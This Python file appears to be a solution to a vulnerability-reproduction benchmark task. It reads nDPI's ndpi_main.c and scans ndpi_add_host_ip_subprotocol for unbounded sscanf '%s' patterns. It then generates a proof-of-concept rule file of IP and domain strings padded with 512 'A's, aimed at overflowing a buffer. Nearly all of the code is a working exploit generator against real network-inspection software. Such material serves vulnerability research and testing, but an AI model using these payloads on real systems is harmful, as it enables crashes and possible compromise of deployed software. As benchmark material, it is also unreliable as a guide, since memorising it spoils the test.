import os
import tarfile
import io
import re
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        def read_file_from_tar(tar: tarfile.TarFile, member_name: str) -> Optional[str]:
            try:
                f = tar.extractfile(member_name)
                if f is None:
                    return None
                data = f.read()
                try:
                    return data.decode('utf-8', errors='ignore')
                except:
                    return None
            except:
                return None

        def find_in_tar(tar: tarfile.TarFile, name_fragment: str) -> Optional[str]:
            # Prefer src/lib/ndpi_main.c but fallback to any path ending with it
            candidates = []
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                low = m.name.lower()
                if low.endswith(name_fragment.lower()):
                    candidates.append(m.name)
            if not candidates:
                return None
            # Prefer shortest path containing src/lib
            candidates.sort(key=lambda x: (0 if 'src/lib/' in x.replace('\\', '/') else 1, len(x)))
            return candidates[0]

        def read_ndpi_main_c(path: str) -> Optional[str]:
            try:
                if os.path.isdir(path):
                    # Try common locations
                    for root, _, files in os.walk(path):
                        for fn in files:
                            if fn == 'ndpi_main.c':
                                full = os.path.join(root, fn)
                                try:
                                    with open(full, 'r', encoding='utf-8', errors='ignore') as f:
                                        return f.read()
                                except:
                                    pass
                    return None
                else:
                    # Try tarball
                    with tarfile.open(path, 'r:*') as tar:
                        member = find_in_tar(tar, 'ndpi_main.c')
                        if member is None:
                            return None
                        return read_file_from_tar(tar, member)
            except:
                return None

        def extract_function_body(code: str, func_name: str) -> Optional[str]:
            # A naive function body extractor
            idx = code.find(func_name)
            if idx < 0:
                return None
            # Find opening brace after function signature
            # Move forward to first '{' after ')'
            paren_depth = 0
            i = idx
            in_string = False
            string_char = ''
            while i < len(code):
                c = code[i]
                if in_string:
                    if c == '\\':
                        i += 2
                        continue
                    elif c == string_char:
                        in_string = False
                else:
                    if c in ('"', "'"):
                        in_string = True
                        string_char = c
                    elif c == '(':
                        paren_depth += 1
                    elif c == ')':
                        if paren_depth > 0:
                            paren_depth -= 1
                        # If paren_depth == 0, we might be at end of signature soon
                    elif c == '{' and paren_depth == 0:
                        # Found start of body
                        start = i
                        # Now find matching brace
                        brace_depth = 0
                        j = i
                        in_str2 = False
                        str_ch2 = ''
                        while j < len(code):
                            ch = code[j]
                            if in_str2:
                                if ch == '\\':
                                    j += 2
                                    continue
                                elif ch == str_ch2:
                                    in_str2 = False
                            else:
                                if ch in ('"', "'"):
                                    in_str2 = True
                                    str_ch2 = ch
                                elif ch == '{':
                                    brace_depth += 1
                                elif ch == '}':
                                    brace_depth -= 1
                                    if brace_depth == 0:
                                        end = j + 1
                                        return code[start:end]
                            j += 1
                        return None
                i += 1
            return None

        def detect_overflow_patterns(body: str):
            # Detect whether vulnerable sscanf patterns use "/%s" or ".%s" into a "tail" variable
            # We don't need to pinpoint variable names; just look for format strings containing "/%s" or ".%s"
            # Also capture presence of "%s" in general to craft payload using long tokens.
            use_slash = False
            use_dot = False
            has_percent_s = False
            # Extract literal strings passed to sscanf
            for m in re.finditer(r'sscanf\s*\([^,]+,\s*"((?:[^"\\]|\\.)*)"', body):
                fmt = m.group(1)
                # Unescape \" and \\ for checking
                fmt_unesc = fmt.encode('utf-8').decode('unicode_escape')
                if '/%s' in fmt_unesc or '%[^/]/%s' in fmt_unesc or '/%s' in fmt:
                    use_slash = True
                if '.%s' in fmt_unesc or '%[^.].%s' in fmt_unesc or '.%s' in fmt:
                    use_dot = True
                if '%s' in fmt_unesc or '%s' in fmt:
                    has_percent_s = True
            return use_slash, use_dot, has_percent_s

        # Try to tailor payloads by analyzing source if available
        code = read_ndpi_main_c(src_path)
        use_slash = True
        use_dot = True
        if code:
            body = extract_function_body(code, 'ndpi_add_host_ip_subprotocol')
            if body:
                s, d, p = detect_overflow_patterns(body)
                use_slash = s or p  # If we see any %s, we'll include slash style by default
                use_dot = d or p    # If we see any %s, include dot style too
            else:
                # Fallback to both
                use_slash = True
                use_dot = True
        else:
            # Fallback to both
            use_slash = True
            use_dot = True

        # Build payloads
        longA = 'A' * 512
        payloads = []
        if use_slash:
            payloads.append(f"192.168.1.1/{longA}")
            payloads.append(f"10.0.0.0/{longA}")
            payloads.append(f"0.0.0.0/{longA}")
        if use_dot:
            payloads.append(f"example.{longA}")
            payloads.append(f"a.{longA}")
            payloads.append(f"{longA}.{longA[:16]}")  # long label before dot

        # Unique payloads
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        # Compose candidate lines in various rule formats
        prefixes = [
            "ip", "host", "domain", "network", "subnet", "IP", "HOST", "DOMAIN"
        ]
        seps = [";", ":", " ", "="]

        lines = []

        # Simple payload-only lines
        for p in unique_payloads:
            lines.append(p)

        # Common "key;id;value" and variations
        for p in unique_payloads:
            for key in prefixes:
                lines.append(f"{key};1;{p}")
                lines.append(f"1;{key};{p}")
                lines.append(f"{key};{p};1")
                lines.append(f"{key}:{p}")
                lines.append(f"{key} {p}")
                lines.append(f"{p} {key}")
                lines.append(f"{key}={p}")
                lines.append(f"{p}")

        # Deduplicate and limit size to keep file manageable
        final_lines = []
        seen_lines = set()
        for ln in lines:
            if ln in seen_lines:
                continue
            seen_lines.add(ln)
            final_lines.append(ln)
            if len(final_lines) >= 120:  # cap number of lines
                break

        poc = "\n".join(final_lines) + "\n"
        return poc.encode('utf-8', errors='ignore')